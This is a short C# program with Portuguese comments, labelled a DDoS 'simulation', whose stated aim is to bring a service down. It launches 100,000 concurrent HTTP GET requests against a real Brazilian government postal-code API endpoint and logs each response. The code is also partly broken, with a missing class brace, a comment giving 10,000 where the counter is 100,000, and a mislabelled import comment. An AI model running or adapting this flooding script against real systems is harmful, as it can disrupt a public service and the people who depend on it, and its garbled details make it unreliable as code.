// Esse exemplo é para o ataque derrubar o serviço

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks; //Para usar tarefas assíncronas (Task).
using System.Net.Http; // Para utilizar Thread.Sleep, que pausa a execução por um tempo.


namespace DDoS
{
    public class SimulacaoDDoS
            public static void Simulacao()
    {
        string url = "https://h-apigateway.conectagov.estaleiro.serpro.gov.br/api-cep/v1/consulta/cep/60130240";
        // Requerimento | Define que serão feitas 10.000 requisições à URL.
        int contador = 100000;

        // Cria e executa as requisições
        using (HttpClient client = new HttpClient())
        {
            Task[] tasks = new Task[contador];
            for (int i = 0; i < contador; i++)
            {
                tasks[i] = SendRequestAsync(client, url, i);
                //Thread.Sleep(500);
            }
        }
    }
    static async Task SendRequestAsync(HttpClient client, string url, int requestId)
    {
        try
        {
            //Envia a requisição  GET
            HttpResponseMessage response = await client.GetAsync(url);
            //client.DefaultRequestHeaders.ToString().Lenght

            //Loga o resultado
            Console.WriteLine($"Requisição {requestId}: {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Requisição {requestId} falhou: {ex.Message}");
        }
    }

}
}
// Essa requisição consegue mandar em média 40.000 bytes | 0,40 MB/s